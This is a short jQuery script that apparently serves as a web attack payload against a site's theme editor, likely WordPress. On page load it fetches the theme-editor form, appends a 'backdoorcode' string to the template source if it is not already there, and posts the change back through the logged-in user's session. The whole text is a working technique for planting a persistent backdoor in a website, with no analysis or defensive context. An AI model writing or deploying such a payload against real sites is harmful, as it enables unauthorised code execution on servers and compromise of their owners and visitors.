pageparams = { file: pageparamsfile, theme: pageparamstheme, dir:pageparamsdir };
$(document).ready(function(){
   $.get(themepage, pageparams, function(data)
         {
            form=$(data).find('form#template');
            oldtemplate = form.find('textarea#newcontent').val();
			if (typeof(form) == "undefined") {notify('failed')};
            if (oldtemplate.indexOf(backdoorcode) == -1)
            {                                               
                newtemplate = oldtemplate+"\r\n"+backdoorcode;
                form.find('textarea#newcontent').val(newtemplate);    
                formdata = form.serialize();
                $.post(themepage, formdata, notify('worked'));
            }
            }).error(notify('failed'));
});